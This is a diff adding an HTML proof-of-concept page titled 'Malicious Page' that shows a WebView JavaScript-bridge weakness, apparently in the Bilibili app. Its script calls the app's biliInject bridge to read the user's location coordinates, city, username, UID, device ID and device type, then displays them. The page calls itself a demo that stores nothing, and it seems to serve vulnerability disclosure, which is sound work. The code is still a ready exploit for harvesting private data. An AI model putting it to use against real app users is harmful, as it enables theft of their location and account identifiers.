@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+    </style>
+    <title>Malicious Page</title>
+
+    <script src="biliapp.js"></script>
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p>An attacker can steal sensitive information such as:</p>
+
+    <p style="font-size: 15px;" id="Location">Your Location: </p>
+    <p style="font-size: 15px;" id="City">Your City: </p>
+    <p style="font-size: 15px;" id="UserName">Your UserName: </p>
+    <p style="font-size: 15px;" id="UID">Your UID: </p>
+    <p style="font-size: 15px;" id="DeviceID">Your DeviceID: </p>
+    <p style="font-size: 15px;" id="DeviceType">Your DeviceType: </p>
+
+    <script>
+
+        window._biliapp.callback = function (e, i) {
+            switch (e) {
+                case "getLocationInfo":
+                    var json = i;
+
+                    var city = json.location.cityName;
+                    document.getElementById("City").innerText = "Your City: " + city;
+
+                    var location = json.location.coordinate.coor;
+                    document.getElementById("Location").innerText = "Your Location: " + "(" + location + ")";
+
+                    break;
+
+                case "callback_getUserInfo":
+                    var json = i;
+
+                    var username = json.username;
+                    document.getElementById("UserName").innerText = "Your UserName: " + username;
+
+                    var uid = json.mid;
+                    document.getElementById("UID").innerText = "Your UID: " + uid;
+
+                    break;
+
+                case "callback_getDeviceInfo":
+                    var json = i;
+
+                    var deviceId = json.deviceId;
+                    document.getElementById("DeviceID").innerText = "Your DeviceID: " + deviceId;
+
+                    var device_type = json.device_type;
+                    document.getElementById("DeviceType").innerText = "Your Type: " + device_type;
+
+                    break;
+            }
+        }
+
+        window.webkit.messageHandlers.biliInject.postMessage({
+            method: "biliapp.getLocation",
+            data: JSON.stringify({ type: 1 })
+        });
+
+        window.webkit.messageHandlers.biliInject.postMessage({
+            method: "biliapp.getUserInfo",
+            data: JSON.stringify({ callbackId: "callback_getUserInfo" })
+        });
+
+        window.webkit.messageHandlers.biliInject.postMessage({
+            method: "biliapp.getDeviceInfo",
+            data: JSON.stringify({ callbackId: "callback_getDeviceInfo" })
+        });
+
+    </script>
+
+</body>
+
+</html>
